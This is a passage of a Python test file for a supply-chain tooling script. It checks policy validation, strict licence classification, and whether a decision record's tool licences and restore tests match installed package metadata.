    path = tmp_path / "supply-chain.yaml" if body is None else _policy(tmp_path, body)
    pol = sc.load_policy(path)
    assert pol["status"] == "INVALID" and pol["errors"]
    assert sc.evaluate(pol, **_reports(tmp_path))["overall"] == "POLICY_INVALID"
    assert sc.main(["evaluate", "--policy", str(path)]) == 2
    assert sc.main(["licenses", "--policy", str(path), "-o", str(tmp_path / "lic.json")]) == 2


def test_several_licence_classifiers_are_never_read_as_alternatives():
    """Classifiers do not say whether several licences are alternatives: every one must be allowed (no lenient OR)."""
    sc = _script("supply_chain")

    class Meta:
        def get(self, key, default=None):
            return None

        def get_all(self, key):
            return ["License :: OSI Approved :: MIT License", "License :: OSI Approved :: GNU General Public License v3"]

    lic = sc._license_of(type("Dist", (), {"metadata": Meta()})())
    assert lic == "GNU General Public License v3 AND MIT License"
    assert not sc.licence_allowed(lic, ["MIT License"]) and sc.licence_allowed(lic, ["MIT License",
                                                                                     "GNU General Public License v3"])


# ------------------------------------------------------------------ W6-126: §45 tool licences + restore tests
def _adr_rows() -> dict[str, list[str]]:
    adr = (ROOT / "docs" / "decisions" / "ADR-0095-ci-gates-supply-chain-and-security-tooling.md").read_text(
        encoding="utf-8")
    table = [ln for ln in adr.splitlines() if ln.startswith("| ")]
    header = [c.strip() for c in table[0].strip("|").split("|")]
    rows = {}
    for ln in table[1:]:  # the |---| separator does not start with "| "
        cells = [c.strip() for c in ln.strip().strip("|").split("|")]
        if len(cells) == len(header):
            rows[cells[0]] = cells
    return {"__header__": header, **rows}


def test_adr_0095_records_each_selected_tools_licence_from_package_metadata():
    rows = _adr_rows()
    header = rows["__header__"]
    assert "Licence (source)" in header
    col = header.index("Licence (source)")
    for need, cells in rows.items():
        if need == "__header__":
            continue
        assert cells[col], need  # every row states a licence, UNKNOWN or NOT_APPLICABLE - never left blank
    lic = {k: v[col] for k, v in rows.items() if k != "__header__"}
    assert "MIT" in lic["Lint"] and "Apache-2.0" in lic["Lint"]  # ruff MIT, typescript Apache-2.0
    assert "MIT" in lic["Type check"] and "MIT" in lic["Controlled tests"]
    assert "Apache Software License" in lic["Dependency vulnerabilities"]  # pip-audit: classifier, no SPDX field
    assert "Apache" in lic["SAST"] and "Apache-2.0" in lic["Browser + basic a11y"]


def test_installed_tool_licences_match_what_the_adr_records():
    """The ADR's metadata claims for tools present in this environment are checked against the metadata itself."""
    from importlib import metadata

    rows = _adr_rows()
    col = rows["__header__"].index("Licence (source)")
    for dist, need in (("ruff", "Lint"), ("mypy", "Type check"), ("pytest", "Controlled tests"),
                       ("playwright", "Browser + basic a11y")):
        try:
            expr = metadata.distribution(dist).metadata.get("License-Expression")
        except metadata.PackageNotFoundError:
            continue
        assert expr and f"{dist} {metadata.version(dist)}: {expr}" in rows[need][col], (dist, rows[need][col])


def test_adr_0095_lists_the_restore_tests():
    rows = _adr_rows()
    restore = rows.get("Restore test")
    assert restore is not None
    assert "tests/unit/test_operations_backup.py" in restore[1] and "G2" in restore[2]
    assert (ROOT / "tests" / "unit" / "test_operations_backup.py").is_file()
